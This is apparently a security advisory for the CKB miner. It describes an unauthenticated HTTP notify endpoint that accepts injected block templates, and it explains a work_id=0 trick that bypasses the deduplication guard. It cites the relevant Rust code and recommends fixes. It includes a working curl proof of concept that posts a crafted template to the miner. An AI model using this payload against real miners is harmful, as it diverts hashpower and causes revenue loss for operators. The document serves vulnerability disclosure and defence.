### Title
Unauthenticated Miner Notify Endpoint Allows Local Template Injection — (`miner/src/client.rs`)

### Summary

When the miner is configured with `listen` mode (`config.listen = Some(addr)`), it binds an HTTP server that accepts `BlockTemplate` notifications from any connecting client with zero authentication. Any unprivileged local process can POST a crafted `BlockTemplate` JSON to this endpoint and cause the miner to abandon legitimate work and mine on an attacker-controlled template.

### Finding Description

`Client::spawn_background` checks for a configured listen address and, if present, spawns `listen_block_template_notify`: [1](#0-0) 

`listen_block_template_notify` binds a raw `TcpListener` and dispatches every accepted connection to the `handle` free function: [2](#0-1) 

The `handle` function performs **no authentication, no IP allowlist check, no method/path check, and no shared-secret verification**. It reads the body, deserializes it as `BlockTemplate`, and immediately calls `update_block_template`: [3](#0-2) 

`update_block_template` then sends the injected work to all mining workers via `new_work_tx`: [4](#0-3) 

There is an additional bypass in the `work_id` deduplication guard. The `fetch_update` closure accepts the new template when `id != work_id || id == 0`. Because `current_work_id` is initialized to `0`, the very first injection always succeeds. After a legitimate update sets it to `N`, an attacker sending `work_id=0` still satisfies `N != 0`, so the injection succeeds again. An attacker can continuously inject `work_id=0` to perpetually override legitimate templates. [5](#0-4) 

The `listen` field is a plain `Option<SocketAddr>` with no additional access-control metadata: [6](#0-5) 

### Impact Explanation

- **Hashpower theft / waste**: Workers receive the injected template and spend CPU/ASIC cycles on an attacker-chosen `parent_hash`. All found nonces are submitted to the node as `submit_block` calls.
- **submit_block RPC flood**: The node receives a stream of `submit_block` calls for blocks built on a stale or invalid parent. Each call triggers consensus validation and, for syntactically valid blocks, compact-block relay to peers, amplifying the load.
- **Mining revenue loss**: The miner earns no block reward while mining on the injected template. On a high-hashrate miner this is a direct, measurable economic loss.

The node's consensus layer will reject the submitted blocks (wrong PoW, wrong parent, etc.), so chain integrity is preserved, but the miner's operational integrity is fully compromised for the duration of the attack.

### Likelihood Explanation

The `listen` mode is a documented, supported production feature. The default config template shows it commented out (`# listen = "127.0.0.1:8888"`), but operators who enable it for push-notification performance gain an unauthenticated attack surface reachable by any local process (or, if bound to `0.0.0.0`, any network peer). [7](#0-6) 

Any unprivileged user account on the same host — a compromised dependency, a container escape, a co-tenant in a shared environment — can exploit this without any special privileges.

### Recommendation

1. **Add a shared secret / token**: Generate a random token at startup (or read it from config) and require it as a `Bearer` token or custom header on every notify request. Reject requests that omit or mismatch it.
2. **Enforce source IP allowlist**: Record the peer address from `listener.accept()` (the `_` currently discarded at line 245) and reject connections that do not originate from the configured CKB node's address.
3. **Bind to loopback only by default**: Document that `0.0.0.0` binds are insecure and default the example config to `127.0.0.1`. [8](#0-7) 

### Proof of Concept

```bash
# 1. Start ckb-miner with listen = "127.0.0.1:8888" in ckb-miner.toml

# 2. Craft a minimal but structurally valid BlockTemplate JSON with
#    a stale parent_hash and work_id=0, then POST it:
curl -s -X POST http://127.0.0.1:8888/ \
  -H 'Content-Type: application/json' \
  -d '{
    "version":"0x0","compact_target":"0x1a08a97e",
    "current_time":"0x17f0d2a4e28",
    "number":"0x1","epoch":"0x708250000001",
    "parent_hash":"0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
    "cycles_limit":"0xd09dc300","bytes_limit":"0x91c08",
    "uncles_count_limit":"0x2","uncles":[],"transactions":[],
    "proposals":[],"cellbase":{"hash":"0x0000000000000000000000000000000000000000000000000000000000000000","cycles":null,"min_replace_fee":null,"data":{"header":{"version":"0x0","compact_target":"0x1a08a97e","timestamp":"0x17f0d2a4e28","number":"0x1","epoch":"0x708250000001","parent_hash":"0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef","transactions_root":"0x0000000000000000000000000000000000000000000000000000000000000000","proposals_hash":"0x0000000000000000000000000000000000000000000000000000000000000000","extra_hash":"0x0000000000000000000000000000000000000000000000000000000000000000","dao":"0x0000000000000000000000000000000000000000000000000000000000000000","nonce":"0x0"},"uncles":[],"transactions":[],"proposals":[]}},"work_id":"0x0","dao":"0x0000000000000000000000000000000000000000000000000000000000000000"
  }'

# 3. Observe in miner logs that workers receive the injected template
#    and begin mining on parent_hash=0xdeadbeef...
# 4. Observe submit_block RPC calls to the node for blocks with that parent.
```

The `work_id=0` value guarantees the injection succeeds regardless of the current `current_work_id` value due to the `id == 0` branch in the deduplication guard.

### Citations

**File:** miner/src/client.rs (L204-232)
```rust
    pub fn spawn_background(self) {
        let client = self.clone();
        if let Some(addr) = self.config.listen {
            ckb_logger::info!("listen notify mode : {}", addr);
            ckb_logger::info!(
                r#"
Please note that ckb-miner runs in notify mode. \
You should configure the corresponding information in CKB block assembler, \
for example:

[block_assembler]
...
notify = ["http://{}"]

Otherwise ckb-miner will malfunction and stop submitting valid blocks after a certain period.
"#,
                addr
            );
            self.handle.spawn(async move {
                client.listen_block_template_notify(addr).await;
            });
            self.blocking_fetch_block_template();
        } else {
            ckb_logger::info!("loop poll mode: interval {}ms", self.config.poll_interval);
            self.handle.spawn(async move {
                client.poll_block_template().await;
            });
        }
    }
```

**File:** miner/src/client.rs (L234-255)
```rust
    async fn listen_block_template_notify(&self, addr: SocketAddr) {
        let listener = TcpListener::bind(addr).await.unwrap();
        let server = auto::Builder::new(TokioExecutor::new());
        let graceful = GracefulShutdown::new();
        let stop_rx: CancellationToken = new_tokio_exit_rx();

        loop {
            let client = self.clone();
            let handle = service_fn(move |req| handle(client.clone(), req));
            tokio::select! {
                conn = listener.accept() => {
                    let (stream, _) = match conn {
                        Ok(conn) => conn,
                        Err(e) => {
                            info!("accept error: {}", e);
                            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                            continue;
                        }
                    };
                    let stream = hyper_util::rt::TokioIo::new(Box::pin(stream));
                    let conn = server.serve_connection_with_upgrades(stream, handle);

```

**File:** miner/src/client.rs (L293-312)
```rust
    fn update_block_template(&self, block_template: BlockTemplate) {
        let work_id = block_template.work_id.into();
        let updated = |id| {
            if id != work_id || id == 0 {
                Some(work_id)
            } else {
                None
            }
        };
        if self
            .current_work_id
            .fetch_update(Ordering::SeqCst, Ordering::SeqCst, updated)
            .is_ok()
        {
            let work: Work = block_template.into();
            if let Err(e) = self.new_work_tx.send(Works::New(work)) {
                error!("notify_new_block error: {:?}", e);
            }
        }
    }
```

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```

**File:** util/app-config/src/configs/miner.rs (L28-30)
```rust
    /// listen block_template notify instead of loop poll
    pub listen: Option<SocketAddr>,
}
```

**File:** resource/ckb-miner.toml (L59-60)
```text
# enable listen notify mode
# listen = "127.0.0.1:8888"
```
